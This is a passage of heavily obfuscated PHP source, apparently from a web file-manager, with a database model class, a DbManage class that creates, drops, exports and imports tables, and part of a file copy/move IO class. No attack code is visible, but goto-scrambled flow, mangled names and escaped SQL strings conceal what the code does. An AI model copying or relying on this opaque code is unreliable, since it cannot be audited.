$this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $CÑËÜ×ËÊŒ =& $_SERVER[¹…ÕÄ]; return isset($this->fields[$CÑËÜ×ËÊŒ[247]]) ? $this->fields[$CÑËÜ×ËÊŒ[247]] : $this->pk; } public function getDbFields() { $CâˆÄ«¶Ü =& $_SERVER[¹…ÕÄ]; if (isset($this->options[$CâˆÄ«¶Ü[275]])) { $a¨É–×Ï§ = $this->db->getFields($this->options[$CâˆÄ«¶Ü[275]]); return $a¨É–×Ï§ ? array_keys($a¨É–×Ï§) : !1; } if ($this->fields) { $a¨É–×Ï§ = $this->fields; unset($a¨É–×Ï§[$CâˆÄ«¶Ü[246]], $a¨É–×Ï§[$CâˆÄ«¶Ü[247]], $a¨É–×Ï§[$CâˆÄ«¶Ü[248]], $a¨É–×Ï§[$CâˆÄ«¶Ü[245]]); return $a¨É–×Ï§; } return !1; } public function data($f‰àÄ¯Ì = '') { $dŒ‹‘¢ÃÔ× =& $_SERVER[¹…ÕÄ]; if ($dŒ‹‘¢ÃÔ×[33] === $f‰àÄ¯Ì && !empty($this->data)) { return $this->data; } if (is_object($f‰àÄ¯Ì)) { $f‰àÄ¯Ì = get_object_vars($f‰àÄ¯Ì); } elseif (is_string($f‰àÄ¯Ì)) { parse_str($f‰àÄ¯Ì, $f‰àÄ¯Ì); } elseif (!is_array($f‰àÄ¯Ì)) { think_exception(think_lang($dŒ‹‘¢ÃÔ×[267])); } $this->data = $f‰àÄ¯Ì; return $this; } public function join($e¢‹Âã«¥Ş) { $eƒ¸œö»Š† =& $_SERVER[¹…ÕÄ]; if (is_array($e¢‹Âã«¥Ş)) { $this->options[$eƒ¸œö»Š†[278]] = $e¢‹Âã«¥Ş; } elseif (!empty($e¢‹Âã«¥Ş)) { $this->options[$eƒ¸œö»Š†[278]][] = $e¢‹Âã«¥Ş; } return $this; } public function union($cäÃäÚùè©, $BùÆ«äƒâ = false) { goto D÷İ‘İâÑ; D÷İ‘İâÑ: $dŸ¤‘­£Œ· =& $_SERVER[¹…ÕÄ]; if (empty($cäÃäÚùè©)) { return $this; } if ($BùÆ«äƒâ) { $this->options[$dŸ¤‘­£Œ·[343]][$dŸ¤‘­£Œ·[344]] = !0; } goto cê»±¬˜×–; cê»±¬˜×–: if (is_object($cäÃäÚùè©)) { $cäÃäÚùè© = get_object_vars($cäÃäÚùè©); } if (is_string($cäÃäÚùè©)) { $a—è‘¶‡é = $cäÃäÚùè©; } elseif (is_array($cäÃäÚùè©)) { if (isset($cäÃäÚùè©[0])) { $this->options[$dŸ¤‘­£Œ·[343]] = array_merge($this->options[$dŸ¤‘­£Œ·[343]], $cäÃäÚùè©); return $this; } else { $a—è‘¶‡é = $cäÃäÚùè©; } } else { think_exception(think_lang($dŸ¤‘­£Œ·[267])); } $this->options[$dŸ¤‘­£Œ·[343]][] = $a—è‘¶‡é; goto A¨ËÔ´¹òĞ; A¨ËÔ´¹òĞ: return $this; goto bå´’á‹Éœ; bå´’á‹Éœ: } public function cache($cİ×‚˜èËÃ = true, $fßÀ×ë¿½‹ = null, $D…’ÚÖ˜¸Ì = '') { $E±İéŠ”É =& $_SERVER[¹…ÕÄ]; if (!1 !== $cİ×‚˜èËÃ) { $this->options[$E±İéŠ”É[345]] = array($E±İéŠ”É[92] => $cİ×‚˜èËÃ, $E±İéŠ”É[335] => $fßÀ×ë¿½‹, $E±İéŠ”É[29] => $D…’ÚÖ˜¸Ì); } return $this; } public function field($bÙ‚‡×İÔÒ, $AÄ«ËÔéİ = false) { $a¨îîæ¡• =& $_SERVER[¹…ÕÄ]; if (!0 === $bÙ‚‡×İÔÒ) { $b¢…¥´Á¿ = $this->getDbFields(); $bÙ‚‡×İÔÒ = $b¢…¥´Á¿ ? $b¢…¥´Á¿ : $a¨îîæ¡•[182]; } elseif ($AÄ«ËÔéİ) { if (is_string($bÙ‚‡×İÔÒ)) { $bÙ‚‡×İÔÒ = explode($a¨îîæ¡•[47], $bÙ‚‡×İÔÒ); } $b¢…¥´Á¿ = $this->getDbFields(); $bÙ‚‡×İÔÒ = $b¢…¥´Á¿ ? array_diff($b¢…¥´Á¿, $bÙ‚‡×İÔÒ) : $bÙ‚‡×İÔÒ; } $this->options[$a¨îîæ¡•[269]] = $bÙ‚‡×İÔÒ; return $this; } public function scope($Cğâô´ãá° = '', $AÎÊª÷ï†Ï = NULL) { $bóË‚ÁºÓê =& $_SERVER[¹…ÕÄ]; if ($bóË‚ÁºÓê[33] === $Cğâô´ãá°) { if (isset($this->_scope[$bóË‚ÁºÓê[34]])) { $Fø¿¥öƒó« = $this->_scope[$bóË‚ÁºÓê[34]]; } else { return $this; } } elseif (is_string($Cğâô´ãá°)) { $d´š¢á²¶á = explode($bóË‚ÁºÓê[47], $Cğâô´ãá°); $Fø¿¥öƒó« = array(); foreach ($d´š¢á²¶á as $eÉ—¿ö™à¥) { if (!isset($this->_scope[$eÉ—¿ö™à¥])) { continue; } $Fø¿¥öƒó« = array_merge($Fø¿¥öƒó«, $this->_scope[$eÉ—¿ö™à¥]); } if (!empty($AÎÊª÷ï†Ï) && is_array($AÎÊª÷ï†Ï)) { $Fø¿¥öƒó« = array_merge($Fø¿¥öƒó«, $AÎÊª÷ï†Ï); } } elseif (is_array($Cğâô´ãá°)) { $Fø¿¥öƒó« = $Cğâô´ãá°; } if (is_array($Fø¿¥öƒó«) && !empty($Fø¿¥öƒó«)) { $this->options = array_merge($this->options, array_change_key_case($Fø¿¥öƒó«)); } return $this; } public function where($dÅÛ„î‚äê, $BëØ‰¬ğÅ = null) { $E£ÛÀ£×¯Å =& $_SERVER[¹…ÕÄ]; if (!is_null($BëØ‰¬ğÅ) && is_string($dÅÛ„î‚äê)) { if (!is_array($BëØ‰¬ğÅ)) { $BëØ‰¬ğÅ = func_get_args(); array_shift($BëØ‰¬ğÅ); } $BëØ‰¬ğÅ = array_map(array($this->db, $E£ÛÀ£×¯Å[339]), $BëØ‰¬ğÅ); $dÅÛ„î‚äê = vsprintf($dÅÛ„î‚äê, $BëØ‰¬ğÅ); } elseif (is_object($dÅÛ„î‚äê)) { $dÅÛ„î‚äê = get_object_vars($dÅÛ„î‚äê); } elseif (is_array($dÅÛ„î‚äê)) { foreach ($dÅÛ„î‚äê as $EòÒÉïš‡÷ => $CÕßÑÌ®¥) { if ((is_numeric($EòÒÉïš‡÷) || !$EòÒÉïš‡÷) && is_string($CÕßÑÌ®¥)) { if (strpos($CÕßÑÌ®¥, $E£ÛÀ£×¯Å[346]) === 0) { continue; } think_trace($E£ÛÀ£×¯Å[347], $E£ÛÀ£×¯Å[33], $E£ÛÀ£×¯Å[46]); die; } } } if (is_string($dÅÛ„î‚äê) && $E£ÛÀ£×¯Å[33] != $dÅÛ„î‚äê) { $c¹İ³›ÃµÂ = array(); $c¹İ³›ÃµÂ[$E£ÛÀ£×¯Å[348]] = $dÅÛ„î‚äê; $dÅÛ„î‚äê = $c¹İ³›ÃµÂ; } if (isset($this->options[$E£ÛÀ£×¯Å[271]])) { $this->options[$E£ÛÀ£×¯Å[271]] = array_merge($this->options[$E£ÛÀ£×¯Å[271]], $dÅÛ„î‚äê); } else { $this->options[$E£ÛÀ£×¯Å[271]] = $dÅÛ„î‚äê; } return $this; } public function limit($D÷®†Òç¨, $e³­¦º¿ë = null) { $AÁÊ¯ö­³¹ =& $_SERVER[¹…ÕÄ]; $this->options[$AÁÊ¯ö­³¹[288]] = is_null($e³­¦º¿ë) ? $D÷®†Òç¨ : $D÷®†Òç¨ . $AÁÊ¯ö­³¹[47] . $e³­¦º¿ë; return $this; } public function page($eÖŠ­·é¬œ, $Aù„ñªİË„ = null) { $fĞµ§¹·Ä =& $_SERVER[¹…ÕÄ]; $this->options[$fĞµ§¹·Ä[349]] = is_null($Aù„ñªİË„) ? $eÖŠ­·é¬œ : $eÖŠ­·é¬œ . $fĞµ§¹·Ä[47] . $Aù„ñªİË„; return $this; } public function comment($båØˆöÜÄŠ) { $this->options[$_SERVER[¹…ÕÄ][350]] = $båØˆöÜÄŠ; return $this; } public function setProperty($b´›µ°’¡­, $Fá™ÀëµµÔ) { if (property_exists($this, $b´›µ°’¡­)) { $this->{$b´›µ°’¡­} = $Fá™ÀëµµÔ; } return $this; } } goto E»óƒê—ÓÜ; F‚¶°×Â™Ì: class DbManage { function __construct($D³â »¨ª, $f¯˜“ó¡„¯ = '') { $this->database = $D³â »¨ª; $this->type = $f¯˜“ó¡„¯; } public function model($AÁ°Ì—Ôšè = '') { return new ModelBase($AÁ°Ì—Ôšè, $_SERVER[¹…ÕÄ][33], $this->database); } public function db($B´ŠÈÍ¯Àã = false) { goto b÷Øå†·àÄ; EÉÆ“îÛ²º: $this->database = $E³óùèĞ™; $C ×ñ‚‚Š = $this->model()->db(); try { $B¶‡İÓÆ…ó = $C ×ñ‚‚Š->execute("\163\150\x6f\x77\40\144\141\164\141\142\x61\163\x65\x73\x20\x6c\x69\x6b\145\40\47{$Eà‡¿†ÄÈ³}\x27"); } catch (Exception $aÎ­’”Ã’ë) { } goto E×–„†¨„ª; E“©­–°¸´: $this->database = $E³óùèĞ™; $C ×ñ‚‚Š->execute("\x75\163\x65\x20\140{$Eà‡¿†ÄÈ³}\140"); return $C ×ñ‚‚Š; goto D¶ƒÖ›‰÷ê; A×ª•¤À©È: $Eà‡¿†ÄÈ³ = $E³óùèĞ™[$Fæ‰ŸâõŸ[908]]; $E³óùèĞ™[$Fæ‰ŸâõŸ[908]] = $Fæ‰ŸâõŸ[33]; if ($E³óùèĞ™[$Fæ‰ŸâõŸ[740]] == $Fæ‰ŸâõŸ[741]) { $c„ßìÌ½Õá = $E³óùèĞ™[$Fæ‰ŸâõŸ[742]]; $E³óùèĞ™[$Fæ‰ŸâõŸ[742]] = substr($c„ßìÌ½Õá, 0, strrpos($c„ßìÌ½Õá, $Fæ‰ŸâõŸ[996])); } goto EÉÆ“îÛ²º; E×–„†¨„ª: if (!$B¶‡İÓÆ…ó) { $C ×ñ‚‚Š->execute("\x63\162\145\141\164\x65\x20\144\141\164\x61\142\141\x73\x65\40\140{$Eà‡¿†ÄÈ³}\x60"); } $E³óùèĞ™[$Fæ‰ŸâõŸ[908]] = $Eà‡¿†ÄÈ³; if ($E³óùèĞ™[$Fæ‰ŸâõŸ[740]] == $Fæ‰ŸâõŸ[741]) { $E³óùèĞ™[$Fæ‰ŸâõŸ[742]] .= $Fæ‰ŸâõŸ[996] . $Eà‡¿†ÄÈ³; } goto E“©­–°¸´; b÷Øå†·àÄ: $Fæ‰ŸâõŸ =& $_SERVER[¹…ÕÄ]; $E³óùèĞ™ = array_change_key_case($this->database); if ($this->type == $Fæ‰ŸâõŸ[9] || !$B´ŠÈÍ¯Àã) { return $this->model()->db(); } goto A×ª•¤À©È; D¶ƒÖ›‰÷ê: } public function createTable($AÅ¢Äæ«Áí, $c‰¡ÙÔ½ï™ = null) { $f§óö‚ª…¿ =& $_SERVER[¹…ÕÄ]; if (!IO::exist($AÅ¢Äæ«Áí)) { ActionCall($f§óö‚ª…¿[997], !0, 0); show_json(LNG($f§óö‚ª…¿[998]), !1); } $CÊ¡÷İÄÀ = sqlSplit(IO::getContent($AÅ¢Äæ«Áí)); foreach ($CÊ¡÷İÄÀ as $fí’‹¿“‰) { if ($c‰¡ÙÔ½ï™) { $F¬ôÔ´­İì = stripos($fí’‹¿“‰, $f§óö‚ª…¿[999]) === 0; if ($F¬ôÔ´­İì) { $c‰¡ÙÔ½ï™->task[$f§óö‚ª…¿[1000]] += 1; } } $this->model()->db()->execute($fí’‹¿“‰); if ($c‰¡ÙÔ½ï™ && $F¬ôÔ´­İì) { preg_match($f§óö‚ª…¿[1001], $fí’‹¿“‰, $b‰ŠŒ¡£‰¥); $c‰¡ÙÔ½ï™->task[$f§óö‚ª…¿[1002]] = $b‰ŠŒ¡£‰¥[1]; $c‰¡ÙÔ½ï™->update(1); } } $this->taskToCache($c‰¡ÙÔ½ï™); } public function insertTable($AæÖ“«§•›, $e½¿‹–İ· = null) { $FÖë–Ü‰ù¦ =& $_SERVER[¹…ÕÄ]; $aß®Ùæº¤ = $this->model()->db(); $c¸ÎÃŞß®ë = $C˜¦Î¿® ? array($C˜¦Î¿®) : $aß®Ùæº¤->getTables(); foreach ($AæÖ“«§•› as $bñ’ƒ¦) { $C˜¦Î¿® = basename($bñ’ƒ¦, $FÖë–Ü‰ù¦[733]); if (!in_array($C˜¦Î¿®, $c¸ÎÃŞß®ë)) { continue; } if ($e½¿‹–İ·) { $e½¿‹–İ·->task[$FÖë–Ü‰ù¦[1002]] = $C˜¦Î¿®; } if (get_filesize($bñ’ƒ¦) == 0) { continue; } $BÒì×¯¾¹Ì = $this->sqlToDb($bñ’ƒ¦, $e½¿‹–İ·); if (!$BÒì×¯¾¹Ì) { ActionCall($FÖë–Ü‰ù¦[997], !0, 0); show_json(LNG($FÖë–Ü‰ù¦[1003]) . "\x5b{$C˜¦Î¿®}\x5d", !1); } } $this->taskToCache($e½¿‹–İ·); } public function sqlFromDb($E«²’‰§¬, $a……Ş“ŒœÃ, $Aé·ĞÊË¡ = null, $aÊŞ›ˆğƒÓ = null) { goto a“˜ †«…»; B¤¾ïŸŒÍ: fclose($C•Œ…ÓÂÆ); return $fİ’±ÅˆÑ“; goto EÜÕ³·˜¾; aåİÄÔÂŠ®: $CºÀì›• = 1; $CÈƒóˆ±æ = 500; $C•Œ…ÓÂÆ = fopen($a……Ş“ŒœÃ, $_SERVER[¹…ÕÄ][1004]); goto cì¢‰é„•ğ; cì¢‰é„•ğ: $BŒÑ’°“¦ = $EĞÙÑ¶Ñ„ß->getPk(); $B¹†‰Ò×Ç‘ = $EĞÙÑ¶Ñ„ß->getDbFields(); do { $fÂÊº§õÓ… = $EĞÙÑ¶Ñ„ß->field($B¹†‰Ò×Ç‘)->order($BŒÑ’°“¦ . $_SERVER[¹…ÕÄ][1005])->selectPage($CÈƒóˆ±æ, $CºÀì›•); $bæ•¡„„Ï‹ = isset($fÂÊº§õÓ…[$_SERVER[¹…ÕÄ][362]][$_SERVER[¹…ÕÄ][364]]) ? $fÂÊº§õÓ…[$_SERVER[¹…ÕÄ][362]][$_SERVER[¹…ÕÄ][364]] : 0; $e¶äÉòˆ˜Û = !empty($fÂÊº§õÓ…[$_SERVER[¹…ÕÄ][365]]) ? $fÂÊº§õÓ…[$_SERVER[¹…ÕÄ][365]] : array(); if (!($aÛ‰ëëòá” = count($e¶äÉòˆ˜Û))) { break; } $c‰—ÈŞ—’ = array(); foreach ($e¶äÉòˆ˜Û as $b±‹İ«§‚¿) { if ($E«²’‰§¬ == $_SERVER[¹…ÕÄ][1006] && $b±‹İ«§‚¿[$_SERVER[¹…ÕÄ][29]] == $_SERVER[¹…ÕÄ][1007]) { $A‰Œ”ª‹×Ñ = json_decode($b±‹İ«§‚¿[$_SERVER[¹…ÕÄ][370]], !0); if ($A‰Œ”ª‹×Ñ[$_SERVER[¹…ÕÄ][28]] == date($_SERVER[¹…ÕÄ][706]) && !$A‰Œ”ª‹×Ñ[$_SERVER[¹…ÕÄ][705]]) { continue; } } if ($aÊŞ›ˆğƒÓ) { $b±‹İ«§‚¿[$_SERVER[¹…ÕÄ][75]] = "\x7b\151\157\72{$aÊŞ›ˆğƒÓ}\x7d" . substr($b±‹İ«§‚¿[$_SERVER[¹…ÕÄ][75]], strlen("\x7b\x69\157\72{$b±‹İ«§‚¿[$_SERVER[¹…ÕÄ][763]]}\x7d")); $b±‹İ«§‚¿[$_SERVER[¹…ÕÄ][763]] = $aÊŞ›ˆğƒÓ; } $c‰—ÈŞ—’[] = $_SERVER[¹…ÕÄ][1008] . $this->sqlEncode($b±‹İ«§‚¿) . $_SERVER[¹…ÕÄ][1009]; } $B·«™Å÷Ç§ = "\x49\116\x53\105\122\x54\40\111\x4e\124\x4f\40\x60{$E«²’‰§¬}\140\40\x28\x60" . implode($_SERVER[¹…ÕÄ][1010], $B¹†‰Ò×Ç‘) . $_SERVER[¹…ÕÄ][1011]; fwrite($C•Œ…ÓÂÆ, $B·«™Å÷Ç§ . implode($_SERVER[¹…ÕÄ][1012], $c‰—ÈŞ—’) . $_SERVER[¹…ÕÄ][67] . PHP_EOL); $CºÀì›•++; $fİ’±ÅˆÑ“ += $aÛ‰ëëòá”; if ($Aé·ĞÊË¡) { $Aé·ĞÊË¡->update($aÛ‰ëëòá”); } } while ($CºÀì›• <= $bæ•¡„„Ï‹); goto B¤¾ïŸŒÍ; a“˜ †«…»: if ($Aé·ĞÊË¡) { $Aé·ĞÊË¡->task[$_SERVER[¹…ÕÄ][1002]] = $E«²’‰§¬; } $EĞÙÑ¶Ñ„ß = $this->model($E«²’‰§¬); $fİ’±ÅˆÑ“ = 0; goto aåİÄÔÂŠ®; EÜÕ³·˜¾: } public function sqlToDb($FĞ‚½³Æ°¹, $FÜ¨¬×š¯¹ = null) { goto B¿©èÇ™…ã; Dµ¤ˆ­ÌÈ: $bğÇí¢°¯— = 500 + 1; while (!feof($a¿öùåÀÍ´)) { if ($FÜ¨¬×š¯¹ && $a™†Ì¢‘è· != 0) { $FÜ¨¬×š¯¹->task[$e·Ğ™¬Ğ÷[1000]] += 1; } $a™†Ì¢‘è·++; $FïèƒÆƒá = trim(fgets($a¿öùåÀÍ´)); $aöâìŠ°µƒ .= $e·Ğ™¬Ğ÷[50] . $this->sqlDecode($FïèƒÆƒá, $this->type); if ($a™†Ì¢‘è· == $bğÇí¢°¯—) { $aöâìŠ°µƒ = rtrim(trim($aöâìŠ°µƒ), $e·Ğ™¬Ğ÷[67]); if (!$a´ËÃ‡³µ·->execute($aöâìŠ°µƒ)) { return !1; } if ($FÜ¨¬×š¯¹) { $FÜ¨¬×š¯¹->update($a™†Ì¢‘è· - 1); } $aöâìŠ°µƒ = $e·Ğ™¬Ğ÷[33]; $a™†Ì¢‘è· = 0; } } fclose($a¿öùåÀÍ´); goto F¬·ìù¤ì‡; B¿©èÇ™…ã: $e·Ğ™¬Ğ÷ =& $_SERVER[¹…ÕÄ]; $a´ËÃ‡³µ· = $this->model()->db(); $a¿öùåÀÍ´ = @fopen($FĞ‚½³Æ°¹, $e·Ğ™¬Ğ÷[1013]); goto añÙÓØô¯Š; añÙÓØô¯Š: if (!$a¿öùåÀÍ´) { return !1; } $a™†Ì¢‘è· = 0; $aöâìŠ°µƒ = $e·Ğ™¬Ğ÷[33]; goto Dµ¤ˆ­ÌÈ; F¬·ìù¤ì‡: if (trim($aöâìŠ°µƒ)) { $aöâìŠ°µƒ = rtrim(trim($aöâìŠ°µƒ), $e·Ğ™¬Ğ÷[67]); if (!$a´ËÃ‡³µ·->execute($aöâìŠ°µƒ)) { return !1; } if ($FÜ¨¬×š¯¹) { $FÜ¨¬×š¯¹->update($a™†Ì¢‘è· - 1); } } return !0; goto FäÑâŸğƒò; FäÑâŸğƒò: } public function dropTable($EéÙã§ÈÆ° = null) { $e·¡ó‰áÒÚ = $this->model()->db(); $aÂŒæÆÃ¬ = $EéÙã§ÈÆ° ? array($EéÙã§ÈÆ°) : $e·¡ó‰áÒÚ->getTables(); if (!$aÂŒæÆÃ¬) { return; } foreach ($aÂŒæÆÃ¬ as $EéÙã§ÈÆ°) { $e·¡ó‰áÒÚ->execute("\x64\162\157\160\40\164\141\x62\154\x65\40\x69\146\x20\x65\x78\151\x73\x74\163\40\140{$EéÙã§ÈÆ°}\140"); } } private function taskToCache($EÂµé‘™å¬ = null) { $B†ùå­ì²† =& $_SERVER[¹…ÕÄ]; if (!$EÂµé‘™å¬) { return; } $fç†©Ì©ÙÓ = array($B†ùå­ì²†[1002] => $EÂµé‘™å¬->task[$B†ùå­ì²†[1002]], $B†ùå­ì²†[1000] => $EÂµé‘™å¬->task[$B†ùå­ì²†[1000]], $B†ùå­ì²†[1014] => $EÂµé‘™å¬->task[$B†ùå­ì²†[1014]]); if ($fç†©Ì©ÙÓ[$B†ùå­ì²†[1000]] == $fç†©Ì©ÙÓ[$B†ùå­ì²†[1014]]) { $fç†©Ì©ÙÓ[$B†ùå­ì²†[712]] = 1; } Cache::set($B†ùå­ì²†[1015] . $EÂµé‘™å¬->task[$B†ùå­ì²†[388]], $fç†©Ì©ÙÓ); $EÂµé‘™å¬->end(); } private function sqlEncode($DÆØ½õç¸Ì) { $eÎ¹ùŠ÷¤Ğ =& $_SERVER[¹…ÕÄ]; $cÄ²Ó÷¶ê  = array(); foreach ($DÆØ½õç¸Ì as $BÓ¡©ä›™ò) { if (is_array($BÓ¡©ä›™ò)) { $BÓ¡©ä›™ò = json_encode_force($BÓ¡©ä›™ò); } $BÓ¡©ä›™ò = addslashes($BÓ¡©ä›™ò); $BÓ¡©ä›™ò = str_replace(array($eÎ¹ùŠ÷¤Ğ[1016], $eÎ¹ùŠ÷¤Ğ[227]), array($eÎ¹ùŠ÷¤Ğ[1017], $eÎ¹ùŠ÷¤Ğ[1018]), $BÓ¡©ä›™ò); $cÄ²Ó÷¶ê [] = str_replace($eÎ¹ùŠ÷¤Ğ[55], $eÎ¹ùŠ÷¤Ğ[1019], $BÓ¡©ä›™ò); } return $eÎ¹ùŠ÷¤Ğ[55] . implode($eÎ¹ùŠ÷¤Ğ[1020], $cÄ²Ó÷¶ê ) . $eÎ¹ùŠ÷¤Ğ[55]; } private function sqlDecode($d‰Á¡ìÜé, $eîè¸¬•›Ê) { $Bóòóä¥Ğ =& $_SERVER[¹…ÕÄ]; $d‰Á¡ìÜé = str_replace(array($Bóòóä¥Ğ[1017], $Bóòóä¥Ğ[1018]), array($Bóòóä¥Ğ[1016], $Bóòóä¥Ğ[227]), $d‰Á¡ìÜé); if ($eîè¸¬•›Ê == $Bóòóä¥Ğ[9]) { $d‰Á¡ìÜé = stripslashes($d‰Á¡ìÜé); } return $d‰Á¡ìÜé; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bøÇ±Ø“¬¾, $cò¾Ù¡¾äá) { goto AÈ¹˜š‘Ç; CšÍæ‹„îª: Hook::trigger($Döä…’§Õ‘[1022] . $bøÇ±Ø“¬¾ . $Döä…’§Õ‘[1023], $fñ©Îù¢ß“); $Aß”ğÖ½‰È = self::driverMake($cò¾Ù¡¾äá[0]); if (method_exists($Aß”ğÖ½‰È, $bøÇ±Ø“¬¾)) { $e‰áçã‹–ë = @call_user_func_array(array($Aß”ğÖ½‰È, $bøÇ±Ø“¬¾), $cò¾Ù¡¾äá); } else { if (method_exists($Aß”ğÖ½‰È, $Döä…’§Õ‘[1024])) { $e‰áçã‹–ë = @call_user_func_array(array($Aß”ğÖ½‰È, $bøÇ±Ø“¬¾), $cò¾Ù¡¾äá); } else { if (method_exists(self, $bøÇ±Ø“¬¾)) { $e‰áçã‹–ë = @call_user_func_array(array(self, $bøÇ±Ø“¬¾), $cò¾Ù¡¾äá); } else { $e‰áçã‹–ë = call_user_func_array(array(parent, $bøÇ±Ø“¬¾), $cò¾Ù¡¾äá); } } } goto D±æ…—‹†¹; AÈ¹˜š‘Ç: $Döä…’§Õ‘ =& $_SERVER[¹…ÕÄ]; $fñ©Îù¢ß“ = $cò¾Ù¡¾äá; $GLOBALS[$Döä…’§Õ‘[1021]] = $Döä…’§Õ‘[1022] . $bøÇ±Ø“¬¾; goto CšÍæ‹„îª; D±æ…—‹†¹: Hook::trigger($Döä…’§Õ‘[1022] . $bøÇ±Ø“¬¾ . $Döä…’§Õ‘[1025], $fñ©Îù¢ß“, $e‰áçã‹–ë); return $e‰áçã‹–ë; goto F·‚ÊŞ©¯; F·‚ÊŞ©¯: } public static function init($DÁ²£­í¥œ) { return self::driverMake($DÁ²£­í¥œ); } public static function copy($A‰¨‰¼‘¶õ, $F»¸†•¶†ê, $a¥œ­×–‚º = false, $EÉàš´Õ£ = false) { return self::copyMoveStart($A‰¨‰¼‘¶õ, $F»¸†•¶†ê, $a¥œ­×–‚º, $_SERVER[¹…ÕÄ][513], $EÉàš´Õ£); } public static function move($b¾ÚØºµù‘, $F›’½ù­ä…, $aÌšƒ¦™„­ = false, $AÇñ³çÉ–î = false) { return self::copyMoveStart($b¾ÚØºµù‘, $F›’½ù­ä…, $aÌšƒ¦™„­, $_SERVER[¹…ÕÄ][515], $AÇñ³çÉ–î); } private static function copyMoveStart($fğ­óÍ—†Ï, $A¥‹Ë¿ĞÉ„, $FÑ‘¢ìšŸ¾, $F¨ê‰¼ª—, $Bõà¢ Ş‹¥) { $D‡½Ç‰ãàİ =& $_SERVER[¹…ÕÄ]; $AÆ²¸Ó¾¶ = array($fğ­óÍ—†Ï, $A¥‹Ë¿ĞÉ„, $FÑ‘¢ìšŸ¾, $Bõà¢ Ş‹¥); Hook::trigger($D‡½Ç‰ãàİ[1022] . $F¨ê‰¼ª— . $D‡½Ç‰ãàİ[1023], $AÆ²¸Ó¾¶); $dÀ÷¬‘ãÊ = self::copyMove($fğ­óÍ—†Ï, $A¥‹Ë¿ĞÉ„, $FÑ‘¢ìšŸ¾, $F¨ê‰¼ª—, $Bõà¢ Ş‹¥); Hook::trigger($D‡½Ç‰ãàİ[1022] . $F¨ê‰¼ª— . $D‡½Ç‰ãàİ[1025], $AÆ²¸Ó¾¶, $dÀ÷¬‘ãÊ); return $dÀ÷¬‘ãÊ; } public static function saveFile($cñË¸¡îìç, $fÔå£¤‚Êå, $d¤õçéÙÅ = true) { goto E¸’É¬šĞ; aÉñÀ‰ê›: $bœ÷‰‘”Îé = self::copyFile($Fğ™«¯ØÏ×, $cñË¸¡îìç, $fêÂĞ§ÂÒ‡, $b¦ªîŠ‡‘, $d•¬£°ã£[$aŠ‡‡à•ç[28]], $a¦™´­ÕŞÍ); if ($Câ‚ÉÎÓô÷) { $bœ÷‰‘”Îé = $Câ‚ÉÎÓô÷->getPathOuter($bœ÷‰‘”Îé); } return $bœ÷‰‘”Îé; goto e×ÃãìÁ‹õ; DĞ‘ê½Œñ¹: $b¦ªîŠ‡‘ = $fêÂĞ§ÂÒ‡->pathFather($fÔå£¤‚Êå); $a¦™´­ÕŞÍ = !0; if (!$d¤õçéÙÅ && self::driverIsSame($Fğ™«¯ØÏ×, $fêÂĞ§ÂÒ‡)) { $a¦™´­ÕŞÍ = !1; } goto aÉñÀ‰ê›; E¸’É¬šĞ: $aŠ‡‡à•ç =& $_SERVER[¹…ÕÄ]; $d•¬£°ã£ = self::info($fÔå£¤‚Êå); $Fğ™«¯ØÏ× = self::driverMake($cñË¸¡îìç); goto fŞËíˆ›; fŞËíˆ›: $fêÂĞ§ÂÒ‡ = self::driverMake($fÔå£¤‚Êå); $Câ‚ÉÎÓô÷ = !1; if ($fêÂĞ§ÂÒ‡->pathParse[$aŠ‡‡à•ç[1026]]) { $AˆµùùóÚÆ = $fêÂĞ§ÂÒ‡->pathParse[$aŠ‡‡à•ç[1026]]; $Câ‚ÉÎÓô÷ = $fêÂĞ§ÂÒ‡; $fêÂĞ§ÂÒ‡ = self::driverMake($AˆµùùóÚÆ); } goto DĞ‘ê½Œñ¹; e×ÃãìÁ‹õ: } private static function copyMove($C£ÑÔ—ÅÉã, $c¼Û“ß×Èˆ, $eì¾Ø¬ç¹, $dö¼ƒóµÛ¶, $e¿Ã› ù ƒ = false) { goto dĞ¿îÑŞŒ½; dĞ¿îÑŞŒ½: $aÓ¢Ëäæ’„ =& $_SERVER[¹…ÕÄ]; if (!$C£ÑÔ—ÅÉã || $C£ÑÔ—ÅÉã == $aÓ¢Ëäæ’„[8] || !$c¼Û“ß×Èˆ) { return !1; } ignore_timeout(); goto ešíÍ•Ş¡š; ešíÍ•Ş¡š: $B„ÈÚÕ…¢ = self::driverMake($C£ÑÔ—ÅÉã); $EÕ¨¶¾ Î = self::driverMake($c¼Û“ß×Èˆ); $aåã‚Æ‘˜ = $dö¼ƒóµÛ¶ == $aÓ¢Ëäæ’„[515]; goto EÀÊ§—×Ñá; EÀÊ§—×Ñá: $d‹ËÚÁ˜Èİ = !1; if ($EÕ¨¶¾ Î->pathParse[$aÓ¢Ëäæ’„[1026]]) { $c¼Û“ß×Èˆ = $EÕ¨¶¾ Î->pathParse[$aÓ¢Ëäæ’„[1026]]; $d‹ËÚÁ˜Èİ = $EÕ¨¶¾ Î; $EÕ¨¶¾ Î = self::driverMake($c¼Û“ß×Èˆ); } self::check($B„ÈÚÕ…¢, $C£ÑÔ—ÅÉã, $EÕ¨¶¾ Î, $c¼Û“ß×Èˆ); goto eë´ƒñ£Ó; eë´ƒñ£Ó: Hook::trigger($aÓ¢Ëäæ’„[72], $B„ÈÚÕ…¢, $C£ÑÔ—ÅÉã, $EÕ¨¶¾ Î, $c¼Û“ß×Èˆ); $Eó÷Ÿè«Ì = self::driverIsSame($B„ÈÚÕ…¢, $EÕ¨¶¾ Î); if ($Eó÷Ÿè«Ì) { if ($dö¼ƒóµÛ¶ == $aÓ¢Ëäæ’„[515] && !method_exists($EÕ¨¶¾ Î, $aÓ¢Ëäæ’„[1027]) && trim($c¼Û“ß×Èˆ, $aÓ¢Ëäæ’„[8]) == trim($EÕ¨¶¾ Î->pathFather($C£ÑÔ—ÅÉã), $aÓ¢Ëäæ’„[8])) { if ($B„ÈÚÕ…¢->pathThis($C£ÑÔ—ÅÉã) != $e¿Ã› ù ƒ && !$B„ÈÚÕ…¢->isTypeObject()) { return $B„ÈÚÕ…¢->rename($C£ÑÔ—ÅÉã, $e¿Ã› ù ƒ); } return $EÕ¨¶¾ Î->getPathOuter($C£ÑÔ—ÅÉã); } if (method_exists($EÕ¨¶¾ Î, $dö¼ƒóµÛ¶)) { return $EÕ¨¶¾ 